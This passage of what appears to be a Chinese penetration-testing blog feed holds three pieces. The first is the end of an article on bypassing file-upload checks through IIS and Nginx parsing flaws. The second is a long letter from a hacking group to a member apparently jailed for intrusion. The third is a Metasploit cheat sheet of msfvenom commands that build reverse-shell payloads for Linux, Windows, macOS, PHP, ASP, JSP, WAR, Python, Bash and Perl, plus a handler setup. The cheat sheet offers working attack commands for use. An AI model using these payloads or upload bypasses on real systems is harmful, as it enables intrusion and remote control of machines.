src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/17.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/18.png" alt="文件上传绕过姿势总结"></p><p><code>IIS7</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/19.png" alt="文件上传绕过姿势总结"></p><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><ul><li><p>解析：<code>任意文件名/任意文件名.php</code>;<code>任意文件名%00.php</code>都当作php来解析</p></li><li><p>描述：例如原文件名<code>test.jpg</code>但内容包含php一句话添加为<code>test.jpg/x.php</code>来进行解析攻击<br>低版本可以子任意文件名后添加<code>%00.php</code>进行截断攻击</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">5</span>.*<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">6</span>.*<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">7</span> &amp;lt;= <span class="hljs-number">0</span>.<span class="hljs-number">7</span>.<span class="hljs-number">65</span><span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">8</span> &amp;lt;= <span class="hljs-number">0</span>.<span class="hljs-number">8</span>.<span class="hljs-number">37</span><span class="hljs-meta"> [Success]</span></code></pre></li></ul><ul><li>注意<br><code>任意文件名/任意文件名.php</code>这个漏洞是因为<code>php-cgi</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/20.png" alt="文件上传绕过姿势总结"></p><h3 id="php-cgi"><a href="#php-cgi" class="headerlink" title="php-cgi"></a>php-cgi</h3><p>这类漏洞主要出现在<code>IIS</code>和<code>Nginx</code>这类以<code>CGI</code>形式调用<code>php</code>的<code>web</code>应用程序<br>而<code>Apache</code>通常是以<code>module</code>的形式去调用<code>php</code>，所以很少出现这个漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/21.png" alt="文件上传绕过姿势总结"><br>可以看到这里实际运行效果是以 <code>cgi.fix_pathinfo = 1</code> 在运行<br>而通常安全意识不高的管理员在安装 <code>IIS+php</code> 或 <code>Nginx+php</code> 的时候都是以默认配置在安装<br>自然这种情况下，这类服务器全都会产生漏洞</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/22.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/23.png" alt="文件上传绕过姿势总结"></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大风车全体成员写给Bge，只为你有一天可以看到。等你归来</title>
    <link href="/p/63e112c8.html"/>
    <url>/p/63e112c8.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章，我是怀着无比沉重的心情，在键盘上一个字一个字码出来了。和小Y说好了晚上6点就想写了，一直到晚上的9点，我打开word却迟迟下不了手，那种难受不是在写医学论文时候的思虑和斟酌。也不是因为不知道写些什么，而是，想说的话太多了。<br>网易云的音乐在随机播放着，直到播放到，现在很火的那部“法医秦明”的网剧的片尾曲“不灭”，我心中拥堵的言语，仿佛有了疏通的管道，一股脑的的涌了出来。这篇文章，我打算以第二人称来写，只为有一天Bge（化名），你可以看的到。</p><p>今天是你进去的第四个月，请原谅我现在才认真的来抒发我的感情。不知道，你到时候还会不会记得当初我们的“大风车”。我也不清楚你具体进去几年，三年或是五年。我知道可能你的前途就此断送了，我恨，我恨那个矮子狗蛋（化名）。我们将来见不到你的日子，都是他一手造成的。<a id="more"></a>你是真的傻，当初我们有说过他这个人不简单，早些离开他，不要给他“卖命”。你却一味的认为，跟着他能赚到钱。不知道，当你看到这篇文章，回头在想想他，心中会不会后悔没有听我们的话。但是，用几年的时间去明白一个道理，看透一个人，这样的代价真的太大了。</p><p>LC，你知道，我们有多想你吗。一个花季少年，在他最应该奋斗和打拼的年纪，却失去了自由。不知道你是不是还记得，当初的哪一份悸动。从我在渗透吧第一次看到NPLT（化名）这个ID开始，我就和老大说，这小子还不错呀，我对他挺好奇的，感觉是个会钻研技术的人。后来你担任了小吧，也进入了我们“大风车”。我们通过进一步的了解，渐渐的熟了，你和“大师智”也被我们称为两个死基佬。什么，“大师智”是谁？他就是那个“纠结的坏”呀。你还记得为什么“Bge”的这个称号是这么来的吗？当时我和老大在看一个叫小智的英雄联盟（LOL）解说视频时候，因为小智的视频是他和他的一个叫Bge的好朋友一起双排打的，然后我就在群里发了，“Bge”还有“大师智”这两个称号。“纠结的坏”就说其实他就是大师智，然后你就说“我是Bge呀”。从此，我们都开始改口叫你Bge，叫那个傻逼大师智。</p><p>Bge，自从你在网络上没了消息，我们就开始对你进行猜测，没想到当时开玩笑的一句“他不会被查水表，被请去喝茶了吧”，竟然成了真。你空间里的说说被定格在了2016.6.6，还是吃了bsrc送的粽子。我多么希望你能在今时今日发一条说说，呐喊一声“妈的，兄弟们。我回来了”。回忆起以前在一起的时光，我们的交集可能真的不多，交流也是在“大风车”里的扯淡和闲聊，毕竟我的职业和互联网交集太少，渗透或许只是我的兴趣罢了。只是有问题的时候，你都会跟我一通乱扯，我也是一脸懵比，到头来还是老大给我解惑。你说你有什么用，你这渗透吧的小吧当的，群里的秩序也不管管，吧里的垃圾广告帖子也不删一删。还好还有小可爱他们，要不我早就把你的小吧给下了。每每和大师智讨论渗透套路起来，一套一套的，现在大师智都毕业出来，找了一份辣鸡但是很稳定的工作了。我相信要是当时你要是不上了狗蛋这艘贼船，也不会有后来的事情。不过你不用担心，在繁衍下一代的速度上，大师智肯定还是比不上你的，毕竟一个长得和失败试验品似的人，哪有那么快呢，哈哈。</p><p>我不知道当你看到这篇文章的时候是什么样的心情，我早上看到一条消息比较生气。小可爱在我们的“大风车”里发“我这辈子是不可能不日战的，又不会写网站，只能靠日站维持生活，牢里比家里好多了，里面的黑阔们个个都是人才，思路好多了 ，技术也特别棒”我直接把他禁言了30分钟。我平时和他们闹着玩也就是玩玩权限禁言他们三四分钟，这次我真的比较生气，因为我想到了你。谁都知道，对于互联网来说时间意味这什么，不要说几年了，就算是两三个月都可能翻天。就说吧，以前谁能想到乌云这个漏洞提交的圣地会垮台，但是事情就是眼睁睁的发生在了网络中。更为重要的是，自由，对于一个正常人，一个20出头的少年意味着什么。我们不知道你在里面过的怎么样，有没有在深夜暗自悔恨当初。我们能为你做的只剩下闲时想起你的那一份心酸和难受。</p><p>你失去联系的那段时间，我也因为工作的原因自己撤去了渗透吧主的身份，我也就是个副吧主，吧里少了我无关痛痒，反正我也是这么想的。所以渗透吧就剩下了老大一个人在管理，至于后来老大找来了谁谁谁。我就不了解了，也没时间去了解。留给我们的只剩下你在2016.6.6之前的回忆，或许等你回来渗透吧真的就变成了修水管渗透的贴吧了，毕竟现在连我都不愿意踏足那里了。你还记得我那时候闲下来时候，每天深夜给你们更新的恐怖小说《恐录》吗？那时候我也是一时冲动，在下班或则在深夜值班时候没事情做，突发奇想，想蛮写蛮写一本小说。故事的大致纲要和路线都在我的脑子里了，每天闲下来时候都会写上几百字甚至上千，只为了晚上给你们在“大风车”里更新给你们看，你还跟我说“给我安排一个好一点的角色”，我那时候就给你分配了一个保安的身份，后来还死了，哈哈哈。然后在你的恳求之下，我让“你”借尸还魂了，让你当了一个体育频道的主持人。其他人的角色身份也都是我一个一个安插上去的，当时小Y还在高三，看不了。我到了周末都会把一周更新的在全部发一遍出来，为了大伙，特别是“队长”的需求，我再忙，也会有想挤出时间去写这本书的冲动。后来自从你跟了狗蛋，在群里基本上我都看不到你的发言了，渐渐的大家对我的这本书的热情也淡了，加上自己的工作开始进入很忙的一段时间，就断更了。《恐录》这本书也胎死腹中，可能写了还不到一半。你以后要是想看也不会有了，说实话之前的剧情，你敢说不期待？以后你要是想看，说不定我会继续为了你和大伙重新开始规划，来一个《恐录2.0》也不一定哦。</p><p>就在前两天我在知乎上看见了一个帖子“如何评价某某某安全团队的狗蛋”。这是一个匿名用户发出来的，大致的内容呢也就是拔了狗蛋的一些底子。“明面上的讲师，成功人士，年少有位，背地里面的疯狂黑产。出名事实上靠团队，很多文章漏洞，都是他团队里的人发现，他发出来而已。”大致上就是这些扒底的内容，在我看来，或许只有经历过事件的我们才知道到底狗蛋是个怎么样的人。在看到这个帖子的时候，怒的是我们整个“大风车”里的所有人。还在搞这一行的或许都不敢用真实的知乎ID发出自己的声音，都是匿名在该骂的骂该吹的吹。我和队长，两个毅然的站了出来，匿名个屁直接一顿狂喷狗蛋，我们最愤怒的话归纳起来，就呐喊一句“还我Bge！”当然，大肆称赞狗蛋的人一抓一大把，然而他们又知道什么呢。狗蛋自己也发文“所谓的一切喷词，都是那些匿名用户的欲加之罪，都是眼红。”难道，狗蛋自己在发出来的时候就不会有一丝的良心谴责吗。可笑，你今天所谓的成功，所谓的利益，难道不是牺牲了某些人的一切吗。匿名的人在喷狗蛋的人，我在这里替“大风车”和Bge谢谢你们。不管你们是不是知道真相，还是只是凑个热闹，人云亦云的扯上两句，我都要感谢你。而那些继续捧这狗蛋的人，我也不想说什么，如果有一天Bge的事情发生在你的周围，甚至是你的身上。我希望你在多年以后登录上自己的知乎帐号看看自己多年前可笑的言论。在这一刻我，真正的感觉到了鲁迅当时对中国的悲哀，他说“哪怕医学能拯救得了中国人孱弱的体质，也救不了国人麻木的精神。凡是愚弱的国民，即使体格如何健全，如何茁壮，也只能做毫无意义的示众的材料和看客，病死多少是不必以为不幸的。”。即使是在这虚拟的网络中，我也感同身受医学真的救不了国人，为了自己的利益，哪怕牺牲无数人的一切，那有如何。但是又能怎么样呢，我至少拥有良心和责任，我不会放弃继续治愈你们。</p><p>我相信每个人所有经历过的朋友，包括曾经的、未来的、甚至失去的朋友，这一切都是命中注定好了的。和你们一样，回想起Bge和自己的一点点交集，感觉友谊虽然浅薄，但是我们都对彼此的流露过自己最真实的感情。我们一起疯狂过，一起互黑过，才有现在我在写此篇文章时候内心的五味杂陈。“想起那天夕阳下的奔跑，那是我们逝去的青春”，这是大风车的头像里的文字。从你离开到现在，直至以后，我们都不会去更改，因为我们怕你不认得回家的路。在这里还有一群在等待着你回来的伙伴，我们的聊天频道也一直替你留着一个位置。</p><p>啊B，你知道你失联以后我们每次想你都干什么吗。我们会打开你的空间看看你的老照片，继续笑你这个猥琐b，可是这个笑却包含了我们满腔的辛酸。你空间里还保存着一张，也是唯一和队长的合影。那时候的队长相比于现在还开朗很多，不知道是随着时间的更迭，还是你的离开。仿佛一切都在变化，以前在我们看来无比珍重，无比渴望的事情，也在逐渐的消散，唯一不变的就是对你的哪一份念想。老朋友呀，我们无能为力呀，谁都没有想到当时在我们看起来是玩笑话的“查水表”有一天会发生在你的身上，条子也没有让你去喝个茶就回来了。真正应该被砍死的那个狗蛋，现在还在张狂的伪装着。自古说书唱戏劝人方，三条大道走中央。善恶到头终有报，人间正道是沧桑。他以为能这么无限的嚣张下去，踩着别人的未来和自由走向他的利益，开玩笑。</p><p>Bge你生活在我们当中，内心却自有你的一片天地，努力和钻研是你的标签，对未来十分好奇并且怀有憧憬，你从来没有放弃自己过自己的梦想，从你加入渗透吧开始，即使有点偏差，大目标依然都未曾改变过。或许你有很多的人生计划，有对未来生活的安排和渴望，也或许你准备了很多惊喜想提供给我们这些朋友，也想过给自己的家人一份温饱和幸福，可是这一切都还没来的及全部实现，你就在追梦的路上停下了脚步。我们永远都无法知道Bge你内心还有多少曾经设想甚至没来得及吐露的梦。我知道，比我们更加难受的是你的家人。一家人苦苦等待着你能够在完成学业后，假期归来，一家团聚吃顿饭。可是一切美满的进行中却被一个这辈子都被人唾骂的狗蛋所终结。其实，说到底还是你内心对完成梦想的过度渴望被狗蛋利用了。不过，Bge如果你现在看到的话，还是希望你能够重新开始自己新的生活，让你的爱，你的欣喜，淹没痛苦和委屈。在追梦的路上，你始终有我们“大风车”里的小伙伴们的陪同，梦想不会随风而去，他依然把握在你的手上。都说“哭过的眼看岁月更清楚”，我不清楚你在里面是否也曾为了自己暂时搁浅的梦眼角滑落泪水，但是心系你的亲人和朋友肯定为了流过泪。我们不希望，在数年后看到一个坠入深渊的LC，我们坚信来年的春天，花儿依然还会开放，那句迟到的“兄弟们，我Bge又回来了。”始终会来到，只不过来的有点慢，苦了我们这些等待已久的人。</p><p>我写了这么久，虽然还有很多很多的话没有吐露出来，但是以上是我此时最想让你看到的。我们“大风车”永远是一个有爱的团体，你的回归永远不会迟到。他们也有很多想对你说的话，你也知道这些搞技术的并不是每一个都像我一样有写作这个天赋，能将自己的情感通过文字表达出来。但是真的不代表他们没有想法，我让他们尽量开心的表达一下，不要太煽情了。毕竟大家要一起快乐的走下去，不是吗？那么以下就是他们各自想对你说的话，也希望你能够看到。</p><p>首先是“426”听说我要写这么一个关于Bge 的文，他说自己也有想说的，但是憋了半天，才憋了两个字。在他的记忆中，和你聊天第一句话就是“Bge”，“干嘛”，“草泥马”，然后每日成就（1/1）。但是，426 一直强调，你对他有恩。以下是他的原话：不知道是14年还是15年，有幸接触到渗透吧，也有幸加入了渗透吧新手集中营。不知道什么原因，突然被吧主拉入了大风车的群，也不知道这是不是一种缘分，能够跟着里面的各种朋友一起度过了这一年又一年。最开始在里面看见Bge，然而我叫他B哥，是因为他很多很多时候都会发自己正在学的东西到群里面，对于当时的我来说，都很高端，很不可及，所以我叫他B哥。Bge是个很不错的人，挺正直年轻的一个朋友，至少在我看来，他还是一个挺单纯很容易接触的。在刚入群的1年中，总是和B哥他们撕逼，一直到后来，请教过B哥几个问题，B哥也是知无不言，哪怕是很不能泄露的那种也都和我交流过，所以对B哥一直印象不错，毕竟是入群后第一个撕逼开玩笑的人。所以，我真的很想他。</p><p>Bge你猜猜下一个是谁，当然是那个我们的“小可爱”了，很让人高兴的是，现在他终于不是那个臭傻吊了，终于和自己喜欢很久的女神在一起了。不过为了女神的幸福，天天三餐吃饼，也成为了被我们鄙视的笑料。小可爱，在你出事以后真的可能是最不安的了，基本每天都在群里说想你。接下来也是他的原话，我也原封不动的发出来：Bge，NPLT，哈哈，又见面了，我是你的乘客，记不记得你每天给我开车了，我那段时间特别开心的呢！听说Bge的名字还是大姐和老大看直播给你起的呢，从一开始的不认识到老司机的过程是多么美好的一段回忆。我们每天的斗图，互黑，都是那么的美好，记不记得我给你买的细说PHP，我可是看着你从小白变成技术牛的过程，我每天傻不拉几的问你弱智的问题，你还一直给我解答，有什么新的发现也提前告诉我，我多么激动啊！看着你在我电脑上的360之行，多崇拜你。你为人也老实，对大家都挺好的，我曾经多么想和你见一面，现在想想真是后悔以前没见过你，现在暂时也没机会了，不过相信有一天我终究会找到你的，请你去大保健哈哈哈，请你吃大餐，你要好好的，要知道我们都在想你，欢迎你回来一起互黑，小司机在这里等老司机回来开车，等你，等你，等你。。。。</p><p>然后是“iceH”，或许Bge你对他的印象是停留在这小子手机上有抢红包外挂，每次有人发红包，无论什么时间，他总是第一个抢到，然后屁都不放一个。但是他和你一样，都是一个懂奋斗，爱钻研都年轻小伙。在得知你的消息以后，也曾牵肠挂肚，也有一肚子的话想对你说：关于Bge吧，在我的映像中是个很逗而且乐于帮助他人的人。记得那时候刚进大风车，有许多问题的时候，问他的时候，他总是会很有耐心的帮忙解决。前段时间听说你进去了，起初我也没在意，以为你是有事没办法上QQ了。但渐渐的，发现你不发言了，也不装逼了，QQ达人也灭了，这个时候我开始慌了。每次看到大师智，就会想起你。愿你早日回归我们大风车这个家庭，我们全体成员等你回来。        </p><p>下一个是我们的“表姐”拉，最近她正在为了制作她的光立方和激光电子琴而绞尽脑汁呢。说起表姐，一个很喜欢写工具，动手能力十足，很有想法的小青年。你是否还记得她博客里自己制作的小游戏2048中还有你头像的小方块呢，你对应的是2048中的32，每次合成到32就能再次看到你那个装b 的头像了。表姐爱动漫，所以她的头像都是一些我也搞不清是什么的动漫角色，但是打开她的博客，你会发现，这扑面而来的还TM的还是动漫角色呀。不过这次我认识，那是可爱并且文武双全的土间埋，小埋（《干物妹！小埋》女主）。一个在家总是披着仓鼠斗篷，二头身，懒惰，任性的熊孩子形象。不过是个性格温柔并且头脑很好，无可挑剔的美少女高中生。Bge，你说实话，想不想找一个这样的女朋友……好了，接下来是表姐想对你说的原话哦：在我印象中，Bge是一个很逗逼又很爱装逼的人，在我知识浅薄的时候帮助我很多，也帮助过大风车很多人，在Bge那我学到了很多渗透知识（现在大多都忘了，2333~），我非常感谢Bge对我的帮助，很怀念Bge装逼的样子，告诉Bge表姐想他。我们在等你回来！</p><p>我们的个人showtime大告白怎么能少了你的好基友“大师智”呢。这个坏小子，现在已经在某某某公司上班了，然而dog改不了吃屎，还是会在上班时间干点其他的屁事。“纠结的坏”这个名字曾经一度成为我们黑他的一个点，到底他在初中年少时候有多么的非主流才能起一个这样子骚气的名字，不得不说他年少时候一定有很多段不堪回首的往事。你们在一起搞事情的日子发生点点点滴滴或许也只有你们彼此懂，就让往事随风而去吧。Bge我知道你好强，没事，大师智这小子到现在还是单身呢，你那么帅分分钟撩一个哪有什么问题。好了，下面是他给你的原话：Bge嘛，嘿嘿嘿。我依然还记得那个中午，临上课前帮Bge提权的事，记得上面有狗，加不上账户，只能修改密码了。不过厚道的我当然没有这么做了，只是把方法告诉了碧哥。从此我们也就一起坐上了友谊的小船。还有就是开语音的时候，那一口“标准”的普通话，用四川话来说，你就是个蛤蟆皮。再然后，就是那段时间，好几次直播被打脸，233333.最后的最后，许久不见，不知你可好，我永远一直都会在大风车等你！</p><p>还记得那个身处高中牢笼之中，依然在周末捣腾他钟爱都渗透的小Y吗。没错哦，现在他也考上了自己心仪的大学满意的专业。我和小Y认识的真的很早，他真的是我在认识你之前，我认为最努力和最勇于去追梦的小伙子。虽然我在认识你之后还是觉得他最有潜力，哈哈哈。和你一样，爱钻研不放弃也是他的标签，不过，仔细想想，我们大风车里的哪一个人又不是这样呢。“总有一天我们为之奋斗和努力的目标，会反过来拥抱我们。”这是我们这一波人始终坚信的真理。当然了，我们的小Y也有许多想对你说的：</p><p>[To our Bge：不知不觉，你也已经消失联系好几个月了！不知道何时能见到你那头像闪烁在我的列表中 ！哎！</p><p>Bge，我和你虽然不太熟，但也算是一起玩过的朋友。大家都相识在我们曾经的“大风车”中！那个时候的你，与我们扯淡，与我们共同进步，与我们一起有说有笑 ！但现在都已经是过去时了！我不得不感叹物是人非啊！</p><p>遇到狗蛋是你这个人生中，可谓最大的转折点。把你捧到了你的巅峰，然而却不知道交友不慎的后果居然有如此之大！想起你的牢狱之灾我就不断叹息，真的第一次知道时心里一震，就像缺了什么似得，很不安生。</p><p>【属于你的回报】</p><p>遇到狗蛋后，据我了解，你们关系真的很不错。就是因为你的你热于助人，而狗蛋呢，他来者不拒（先不谈论关于狗蛋）所以自然而然玩得不错。你为他做了很多事情，你们一起日高权的站。随着你的技术与名声越来越大，圈子里的人了知道“狗蛋”还有你这个朋友“NPLT”，这是外人对你的尊称。在接下来的这年，你为他论坛录制视频，操心不少。在补天的团队获奖被邀去京，你当之无愧的作为代表人去了。你知道当时我们有多么的羡慕你能站上那个舞台，见识这么大场面，可以说现在我的目标之一，还是可以获此殊荣 。</p><p>我依然记得那天的颁奖直播，我看到了羞涩的Bge， 紧张的在颁奖现场，我们一群人看着直播，夸着这么帅气的你，看着这么高大的你。哎！肯定这段日子也是你最开心的时候了，但是接下来……</p><p>【谁也想不到的遭遇】</p><p>终于到了最悲伤的阶段。你与他的关系与日俱增，越来越好。却不知道为他扛得锅越来越多 ，可是你却没有看清楚他在利用你们（此处省略甲乙丙）扩大自己的名气。</p><p>但是我失策了，我真的失策了！我知道他干的勾当，我也知道他有后台。但是我不知道，在你，这个与他玩了日日夜夜的，我们的Bge出事的时候，他没有选择保你。他为了自己的利益，完全没有考虑过你，甚至现在依然逍遥，没有半点悔意。我到现在都没有看到他发过任何感慨，就像无所谓似得 ？ WTF “你还我们的Bge！”</p><p>事已至此，说什么也没用了。你遭遇此难，也算是不公平的老天给你的试炼，但是我们依然痛心。</p><p>其他没什么，我相信你一定能挺过来，我们会等着你回来的 ！</p><p>——————-致我们的永远的Bge ]</p><p>不知道Bge你看到这里，面对大伙的真情流露是否已经内牛满面，至少也应该明白了自己不寂寞了吧。当然了，我们的大风车里还有一个不会尬舞的“魔法天女”—队长！现在我也忘记了，队长这个名字是从何而来的了，但是这个来自中国传媒大学的少女总是能给我们的平静的生活带来一点刺激和多彩。我不管她现在是那个穿着破裤子还让外婆缝的大姑娘，还是开着狂拽酷炫屌炸天摩托车的狂野女郎。“队长”这两个字，和你Bge一样，都和我们大风车牢牢地挂勾在了一起。替你抱不平的是她，替你呐喊的也总是她。你空间还保留着和她的那张酷酷的合照，也是她每次想你时候可以看看的地方。或许“队长”坚韧的心让她不会替你哭泣，但是她却有无数的话想对你诉说：（由于队长暂时出去玩了，没把想说的发给我，二改必然补上，尽请期待！）</p><p>最后想对你两句的当然还有我们的老大了，毕竟boss总是压轴出场的。回想起每次我和老大出去吃饭，谈论到你，剩下的也只有惋惜。现在老大工作忙了加上有了家庭，也没有太多的时间和我们在“大风车”里愉快的玩耍了，但是他还是总出现在我们最需要帮助的时候。当我们遇到瓶颈的时候，他的一两句指点，往往就能让我们遇到问题迎刃而解。老大话不多，但是句句精辟，他想对你说的就一句话：“唉！成天骂人傻逼最后自己当了傻逼。”或许，这句话看似好笑，但是却包含了老大对你的惋惜和意味深长。人生如棋，一步走错了，满盘皆输？我看未必，命运始终是把握在自己的手上，即使是失去一切也不意味着缺憾，何况你还没有失去一切，你至少还剩下等待你回来的亲人和我们这一群朋友，难道不是吗？</p><p>大风车里还有一些小伙伴有很多话想对你说的，但是由于工作的忙碌，无法表达。我也替他们将千言万语汇成一句话：Bge，大风车永远是你的家，等你回来！</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf的各种生成payload命令</title>
    <link href="/p/d6e1a656.html"/>
    <url>/p/d6e1a656.html</url>
    
    <content type="html"><![CDATA[<p>Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</p><a id="more"></a><p>List payloads</p><p>msfvenom -l</p><h2 id="Os-Payloads"><a href="#Os-Payloads" class="headerlink" title="Os Payloads:"></a>Os Payloads:</h2><p><strong>Linux</strong></p><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p><p><strong>Windows</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p><p><strong>Mac</strong></p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p><h2 id="Web-Payloads："><a href="#Web-Payloads：" class="headerlink" title="Web Payloads："></a>Web Payloads：</h2><p><strong>PHP</strong></p><p><code>  msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p><p><strong>ASP</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p><p><strong>JSP</strong></p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p><p><strong>WAR</strong></p><p><code>  msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p><h2 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads:"></a>Scripting Payloads:</h2><p><strong>Python</strong></p><p><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p><p><strong>Bash</strong></p><p><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p><p><strong>Perl</strong></p><p><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode:"></a>Shellcode:</h2><p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p><p><strong>Linux Based Shellcode</strong></p><p><code>  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p><strong>Windows Based Shellcode</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p><strong>Mac Based Shellcode</strong></p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><h2 id="Handlers："><a href="#Handlers：" class="headerlink" title="Handlers："></a>Handlers：</h2><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p><p><code>  use exploit/multi/handler set PAYLOAD &lt;Payload name&gt; set LHOST &lt;LHOST value&gt; set LPORT &lt;LPORT value&gt; set ExitOnSession false exploit -j -z</code></p><p>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我想说的话，我的大风车</title>
    <link href="/p/cef53610.html"/>
    <url>/p/cef53610.html</url>
    
